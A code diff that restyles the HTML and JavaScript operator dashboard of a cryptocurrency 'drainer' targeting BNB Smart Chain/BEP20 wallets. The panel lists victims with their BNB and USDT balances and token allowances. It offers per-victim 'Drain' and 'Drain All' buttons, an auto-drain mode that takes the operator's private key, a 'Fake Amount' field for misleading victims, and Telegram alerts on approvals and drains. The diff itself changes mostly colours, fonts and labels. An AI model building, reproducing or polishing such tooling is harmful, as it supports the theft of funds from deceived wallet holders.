@@ -3,50 +3,58 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Drainer Admin</title>
+  <title>Cyber Admin // BSC</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Share+Tech+Mono&display=swap');
     *{margin:0;padding:0;box-sizing:border-box}
-    :root{--bg:#0B0E11;--card:#14171C;--border:#1E2329;--text:#EAECEF;--muted:#848E9C;--blue:#0500FF;--green:#0ECB81;--red:#F6465D;--yellow:#F0B90B}
-    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
+    :root{
+      --bg:#05060a;--card:#0c0e14;--border:#1a1f2e;
+      --text:#e8f0ff;--muted:#6b7a99;
+      --cyan:#00f0ff;--magenta:#ff00aa;--lime:#39ff14;--orange:#ff9f1c;--red:#ff2a6d;
+      --glow:0 0 12px rgba(0,240,255,.35);
+    }
+    body{font-family:'Share Tech Mono',monospace;background:var(--bg);color:var(--text);min-height:100vh;background-image:radial-gradient(ellipse at top,#0a1220 0%,#05060a 60%),linear-gradient(rgba(0,240,255,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,240,255,.03) 1px,transparent 1px);background-size:100% 100%,40px 40px,40px 40px}
     .login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh}
-    .login-box{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:32px;width:100%;max-width:360px}
-    .login-box h1{font-size:22px;margin-bottom:8px}
-    .login-box p{color:var(--muted);font-size:13px;margin-bottom:24px}
-    input,select{width:100%;background:#0B0E11;border:1px solid var(--border);border-radius:10px;padding:12px 14px;color:var(--text);font-size:14px;outline:none}
-    input:focus{border-color:var(--blue)}
-    .btn{padding:12px 20px;border:none;border-radius:10px;font-weight:600;font-size:14px;cursor:pointer}
-    .btn-primary{background:var(--blue);color:#fff;width:100%}
-    .btn-green{background:var(--green);color:#0B0E11}
+    .login-box{background:var(--card);border:1px solid var(--cyan);border-radius:4px;padding:36px;width:100%;max-width:380px;box-shadow:var(--glow),inset 0 0 30px rgba(0,240,255,.05)}
+    .login-box h1{font-family:Orbitron,sans-serif;font-size:20px;letter-spacing:3px;color:var(--cyan);text-shadow:0 0 8px var(--cyan);margin-bottom:6px}
+    .login-box p{color:var(--muted);font-size:12px;margin-bottom:24px;letter-spacing:1px}
+    input,select{width:100%;background:#06080f;border:1px solid var(--border);border-radius:2px;padding:12px 14px;color:var(--text);font-size:14px;font-family:inherit;outline:none}
+    input:focus{border-color:var(--cyan);box-shadow:0 0 8px rgba(0,240,255,.25)}
+    .btn{padding:12px 20px;border:none;border-radius:2px;font-weight:700;font-size:13px;cursor:pointer;font-family:Orbitron,sans-serif;letter-spacing:1px;text-transform:uppercase}
+    .btn-primary{background:linear-gradient(135deg,var(--cyan),#0088aa);color:#000;width:100%;box-shadow:0 0 15px rgba(0,240,255,.4)}
+    .btn-primary:hover{filter:brightness(1.15)}
+    .btn-green{background:var(--lime);color:#000}
     .btn-red{background:var(--red);color:#fff}
     .btn-outline{background:transparent;border:1px solid var(--border);color:var(--text)}
-    .btn-sm{padding:6px 12px;font-size:12px}
+    .btn-sm{padding:6px 12px;font-size:11px}
     #dashboard{display:none}
-    .topbar{display:flex;align-items:center;justify-content:space-between;padding:16px 24px;border-bottom:1px solid var(--border);background:var(--card);position:sticky;top:0;z-index:10}
-    .topbar h1{font-size:18px}
+    .topbar{display:flex;align-items:center;justify-content:space-between;padding:14px 24px;border-bottom:1px solid var(--border);background:rgba(12,14,20,.9);backdrop-filter:blur(8px);position:sticky;top:0;z-index:10}
+    .topbar h1{font-family:Orbitron,sans-serif;font-size:16px;letter-spacing:2px;color:var(--cyan);text-shadow:0 0 6px var(--cyan)}
     .topbar-actions{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
-    .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;padding:20px 24px}
-    .stat{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px}
-    .stat-label{font-size:11px;color:var(--muted);text-transform:uppercase}
-    .stat-value{font-size:24px;font-weight:700;margin-top:4px}
-    .stat-value.green{color:var(--green)}
+    .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;padding:20px 24px}
+    .stat{background:var(--card);border:1px solid var(--border);border-radius:4px;padding:16px;position:relative;overflow:hidden}
+    .stat::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--cyan),var(--magenta))}
+    .stat-label{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:1px}
+    .stat-value{font-family:Orbitron,sans-serif;font-size:22px;font-weight:700;margin-top:6px;color:var(--cyan)}
+    .stat-value.green{color:var(--lime)}
     .main-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;padding:0 24px 24px}
-    .card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:20px}
-    .card h2{font-size:15px;margin-bottom:16px}
+    .card{background:var(--card);border:1px solid var(--border);border-radius:4px;padding:20px;box-shadow:0 0 20px rgba(0,0,0,.3)}
+    .card h2{font-family:Orbitron,sans-serif;font-size:13px;letter-spacing:2px;color:var(--magenta);margin-bottom:16px;text-transform:uppercase}
     .form-group{margin-bottom:14px}
-    .form-group label{display:block;font-size:12px;color:var(--muted);margin-bottom:6px}
-    .users-table{width:100%;border-collapse:collapse;font-size:13px}
-    .users-table th{text-align:left;padding:10px 12px;color:var(--muted);font-weight:500;border-bottom:1px solid var(--border);font-size:11px;text-transform:uppercase}
+    .form-group label{display:block;font-size:11px;color:var(--muted);margin-bottom:6px;letter-spacing:1px}
+    .users-table{width:100%;border-collapse:collapse;font-size:12px}
+    .users-table th{text-align:left;padding:10px 12px;color:var(--cyan);font-weight:500;border-bottom:1px solid var(--border);font-size:10px;text-transform:uppercase;letter-spacing:1px}
     .users-table td{padding:12px;border-bottom:1px solid var(--border)}
-    .badge{display:inline-block;padding:3px 8px;border-radius:6px;font-size:11px;font-weight:600}
-    .badge-connected{background:rgba(5,0,255,.15);color:#7b75ff}
-    .badge-approved{background:rgba(14,203,129,.15);color:var(--green)}
-    .badge-drained{background:rgba(246,70,93,.15);color:var(--red)}
-    .badge-ready{background:rgba(240,185,11,.15);color:var(--yellow)}
-    .msg{padding:10px 14px;border-radius:8px;margin-bottom:12px;font-size:13px}
-    .msg-ok{background:rgba(14,203,129,.12);color:var(--green)}
-    .msg-err{background:rgba(246,70,93,.12);color:var(--red)}
-    .mono{font-family:ui-monospace,monospace;font-size:12px}
-    .quick-info{font-size:13px;color:var(--muted);line-height:1.7}
+    .badge{display:inline-block;padding:3px 8px;border-radius:2px;font-size:10px;font-weight:700;letter-spacing:1px}
+    .badge-connected{background:rgba(0,240,255,.15);color:var(--cyan);border:1px solid rgba(0,240,255,.3)}
+    .badge-approved{background:rgba(57,255,20,.12);color:var(--lime);border:1px solid rgba(57,255,20,.3)}
+    .badge-drained{background:rgba(255,42,109,.12);color:var(--red);border:1px solid rgba(255,42,109,.3)}
+    .badge-ready{background:rgba(255,159,28,.12);color:var(--orange);border:1px solid rgba(255,159,28,.3)}
+    .msg{padding:10px 14px;border-radius:2px;margin-bottom:12px;font-size:12px}
+    .msg-ok{background:rgba(57,255,20,.1);color:var(--lime);border:1px solid rgba(57,255,20,.25)}
+    .msg-err{background:rgba(255,42,109,.1);color:var(--red);border:1px solid rgba(255,42,109,.25)}
+    .mono{font-family:'Share Tech Mono',monospace;font-size:12px}
+    .quick-info{font-size:12px;color:var(--muted);line-height:1.8}
     .section-full{padding:0 24px 24px}
     .toggle{display:flex;align-items:center;gap:10px;margin-bottom:12px}
     .toggle input{width:auto}
@@ -56,23 +64,23 @@
 <body>
   <div class="login-wrap" id="loginScreen">
     <div class="login-box">
-      <h1>Drainer Admin</h1>
-      <p>BNB Smart Chain / BEP20</p>
+      <h1>CYBER ADMIN</h1>
+      <p>BNB SMART CHAIN // BEP20 DRAINER</p>
       <div class="form-group">
-        <input type="password" id="passInput" placeholder="Admin password" onkeydown="if(event.key==='Enter')login()">
+        <input type="password" id="passInput" placeholder="ACCESS KEY" onkeydown="if(event.key==='Enter')login()">
       </div>
-      <button class="btn btn-primary" onclick="login()">Login</button>
+      <button class="btn btn-primary" onclick="login()">ENTER</button>
       <div id="loginMsg" style="margin-top:12px"></div>
     </div>
   </div>
 
   <div id="dashboard">
     <div class="topbar">
-      <h1>Drainer Admin</h1>
+      <h1>CYBER ADMIN // LIVE</h1>
       <div class="topbar-actions">
-        <button class="btn btn-outline btn-sm" onclick="loadUsers()">Refresh</button>
-        <button class="btn btn-green btn-sm" onclick="drainAll()">Drain All</button>
-        <button class="btn btn-outline btn-sm" onclick="logout()">Logout</button>
+        <button class="btn btn-outline btn-sm" onclick="loadUsers()">REFRESH</button>
+        <button class="btn btn-green btn-sm" onclick="drainAll()">DRAIN ALL</button>
+        <button class="btn btn-outline btn-sm" onclick="logout()">LOGOUT</button>
       </div>
     </div>
     <div id="globalMsg" style="padding:12px 24px 0"></div>
@@ -86,53 +94,52 @@
       <div class="card">
         <h2>Settings</h2>
         <div class="form-group">
-          <label>Receiver Wallet Address (BEP20 - 0x...)</label>
-          <input type="text" id="cfgReceiver" placeholder="0x... your wallet">
+          <label>Receiver Wallet (0x...)</label>
+          <input type="text" id="cfgReceiver" placeholder="0x...">
         </div>
         <div class="form-group">
-          <label>Private Key (for Auto Drain)</label>
-          <input type="password" id="cfgPrivateKey" placeholder="64 hex chars, leave blank if manual">
+          <label>Private Key (Auto Drain)</label>
+          <input type="password" id="cfgPrivateKey" placeholder="64 hex chars">
         </div>
         <div class="toggle">
           <input type="checkbox" id="cfgAutoDrain">
-          <label for="cfgAutoDrain" style="margin:0">Auto Drain ON (when balance + approved)</label>
+          <label for="cfgAutoDrain" style="margin:0">Auto Drain ON</label>
         </div>
         <div class="form-group">
-          <label>Fake Amount Shown to Users</label>
+          <label>Fake Amount</label>
           <input type="text" id="cfgFakeAmount" value="5000000">
         </div>
         <div class="form-group">
-          <label>New Admin Password</label>
+          <label>New Access Key</label>
           <input type="password" id="cfgNewPass" placeholder="Leave blank to keep">
         </div>
-        <button class="btn btn-primary" onclick="saveSettings()">Save Settings</button>
+        <button class="btn btn-primary" onclick="saveSettings()">SAVE</button>
       </div>
       <div class="card">
-        <h2>Telegram Bot</h2>
+        <h2>Telegram</h2>
         <div class="form-group">
           <label>Bot Token</label>
-          <input type="text" id="cfgTgToken" placeholder="123456:ABC-DEF...">
+          <input type="text" id="cfgTgToken" placeholder="123456:ABC...">
         </div>
         <div class="form-group">
           <label>Chat ID</label>
-          <input type="text" id="cfgTgChat" placeholder="-100... or your id">
+          <input type="text" id="cfgTgChat" placeholder="-100...">
         </div>
-        <button class="btn btn-outline btn-sm" onclick="testTg()" style="margin-bottom:16px">Test Telegram</button>
+        <button class="btn btn-outline btn-sm" onclick="testTg()" style="margin-bottom:16px">TEST PING</button>
         <div class="quick-info">
-          1. @BotFather se bot banao, token lo<br>
-          2. Bot ko start karo, Chat ID lo (@userinfobot)<br>
-          3. Save Settings<br>
-          4. Approve / Deposit / Drain pe message aayega
+          1. @BotFather → token<br>
+          2. Start bot + get Chat ID<br>
+          3. SAVE → alerts live
         </div>
       </div>
     </div>
     <div class="section-full">
       <div class="card">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:10px">
-          <h2 style="margin:0">Connected Users</h2>
+          <h2 style="margin:0">CONNECTED NODES</h2>
           <div style="display:flex;gap:8px;align-items:center">
-            <input type="text" id="searchId" placeholder="Search ID / Address" style="width:160px;padding:8px 10px;font-size:12px" oninput="filterUsers()">
-            <span style="font-size:12px;color:var(--muted)" id="lastUpdate"></span>
+            <input type="text" id="searchId" placeholder="SEARCH ID / ADDR" style="width:160px;padding:8px 10px;font-size:12px" oninput="filterUsers()">
+            <span style="font-size:11px;color:var(--muted)" id="lastUpdate"></span>
           </div>
         </div>
         <div style="overflow-x:auto">
@@ -142,14 +149,14 @@
                 <th>Address</th>
                 <th>BNB</th>
                 <th>USDT</th>
-                <th>Allowance</th>
+                <th>Allow</th>
                 <th>Status</th>
                 <th>Connected</th>
                 <th>Actions</th>
               </tr>
             </thead>
             <tbody id="usersBody">
-              <tr><td colspan="7" style="text-align:center;color:var(--muted)">No users yet</td></tr>
+              <tr><td colspan="7" style="text-align:center;color:var(--muted)">NO NODES</td></tr>
             </tbody>
           </table>
         </div>
@@ -178,7 +185,7 @@
         loadUsers();
         setInterval(loadUsers, 15000);
       } catch (e) {
-        document.getElementById("loginMsg").innerHTML = "<div class=\"msg msg-err\">Wrong password</div>";
+        document.getElementById("loginMsg").innerHTML = '<div class="msg msg-err">ACCESS DENIED</div>';
       }
     }
     function logout() {
@@ -197,7 +204,7 @@
     async function saveSettings() {
       const receiver = document.getElementById("cfgReceiver").value.trim();
       if (receiver && !/^0x[a-fA-F0-9]{40}$/.test(receiver)) {
-        showMsg("Enter valid 0x address", "err");
+        showMsg("Invalid 0x address", "err");
         return;
       }
       const body = {
@@ -214,7 +221,7 @@
       if (np) body.adminPassword = np;
       try {
         await api("/api/admin/config", { method: "POST", body: JSON.stringify(body) });
-        showMsg("Settings saved", "ok");
+        showMsg("SETTINGS SAVED", "ok");
         if (np) { adminPass = np; localStorage.setItem("adminPass", np); }
       } catch (e) {
         showMsg(e.error || "Save failed", "err");
@@ -223,9 +230,9 @@
     async function testTg() {
       try {
         await api("/api/admin/test-telegram", { method: "POST" });
-        showMsg("Test message sent", "ok");
+        showMsg("PING SENT", "ok");
       } catch (e) {
-        showMsg(e.error || "Telegram failed - check token/chat id", "err");
+        showMsg(e.error || "Telegram failed", "err");
       }
     }
     async function loadUsers() {
@@ -238,7 +245,7 @@
         document.getElementById("statDrained").textContent = users.filter(u => u.drained).length;
         const total = users.reduce((s,u) => s + parseFloat(u.drainedAmount||0), 0);
         document.getElementById("statAmount").textContent = total.toFixed(2);
-        document.getElementById("lastUpdate").textContent = "Updated " + new Date().toLocaleTimeString();
+        document.getElementById("lastUpdate").textContent = "SYNC " + new Date().toLocaleTimeString();
       } catch (e) {}
     }
     function badgeClass(u) {
@@ -256,43 +263,42 @@
       try { return new Date(d).toLocaleString(); } catch(e) { return d; }
     }
     async function refreshUser(id) {
-      showMsg("Refreshing...", "ok");
+      showMsg("REFRESHING...", "ok");
       await api("/api/admin/refresh/" + id, { method: "POST" });
       loadUsers();
     }
     async function drainUser(id) {
-      if (!confirm("Drain this user?")) return;
-      showMsg("Draining...", "ok");
+      if (!confirm("DRAIN THIS NODE?")) return;
+      showMsg("DRAINING...", "ok");
       try {
         const r = await api("/api/admin/drain/" + id, { method: "POST" });
-        showMsg("Done: " + (r.amount || "") + (r.txHash ? " Tx: " + r.txHash : ""), "ok");
+        showMsg("DONE: " + (r.amount || "") + (r.txHash ? " Tx: " + r.txHash : ""), "ok");
         loadUsers();
       } catch (e) {
         showMsg(e.error || e.message || "Failed", "err");
       }
     }
     async function drainAll() {
-      if (!confirm("Drain ALL approved?")) return;
-      showMsg("Processing...", "ok");
+      if (!confirm("DRAIN ALL APPROVED?")) return;
+      showMsg("PROCESSING...", "ok");
       try {
-        const r = await api("/api/admin/drain-all", { method: "POST" });
-        showMsg("Done", "ok");
+        await api("/api/admin/drain-all", { method: "POST" });
+        showMsg("DONE", "ok");
         loadUsers();
       } catch (e) {
         showMsg(e.error || "Failed", "err");
       }
     }
     async function deleteUser(id) {
-      if (!confirm("Remove?")) return;
+      if (!confirm("REMOVE NODE?")) return;
       await api("/api/admin/user/" + id, { method: "DELETE" });
       loadUsers();
     }
-    
     function filterUsers() {
       const q = (document.getElementById("searchId").value || "").toLowerCase().trim();
       if (!q) { renderUsers(allUsers); return; }
-      const filtered = allUsers.filter(u => 
-        (u.id||"").toLowerCase().includes(q) || 
+      const filtered = allUsers.filter(u =>
+        (u.id||"").toLowerCase().includes(q) ||
         (u.address||"").toLowerCase().includes(q) ||
         (u.id||"").slice(0,8).toLowerCase() === q
       );
@@ -301,7 +307,7 @@
     function renderUsers(users) {
       const tbody = document.getElementById("usersBody");
       if (!users.length) {
-        tbody.innerHTML = "<tr><td colspan=\"7\" style=\"text-align:center;color:var(--muted)\">No users</td></tr>";
+        tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:var(--muted)">NO NODES</td></tr>';
         return;
       }
       tbody.innerHTML = users.map(u => `
@@ -313,8 +319,8 @@
           <td><span class="badge badge-${badgeClass(u)}">${u.status||"connected"}</span></td>
           <td>${formatDate(u.connectedAt)}</td>
           <td>
-            <button class="btn btn-outline btn-sm" onclick="refreshUser('${u.id}')">Refresh</button>
-            <button class="btn btn-green btn-sm" onclick="drainUser('${u.id}')" ${u.drained?"disabled":""}>Drain</button>
+            <button class="btn btn-outline btn-sm" onclick="refreshUser('${u.id}')">SYNC</button>
+            <button class="btn btn-green btn-sm" onclick="drainUser('${u.id}')" ${u.drained?"disabled":""}>DRAIN</button>
             <button class="btn btn-red btn-sm" onclick="deleteUser('${u.id}')">X</button>
           </td>
         </tr>
@@ -322,7 +328,7 @@
     }
     function showMsg(text, type) {
       const el = document.getElementById("globalMsg");
-      el.innerHTML = "<div class=\"msg msg-" + type + "\">" + text + "</div>";
+      el.innerHTML = '<div class="msg msg-' + type + '">' + text + '</div>';
       setTimeout(() => el.innerHTML = "", 6000);
     }
     if (adminPass) {
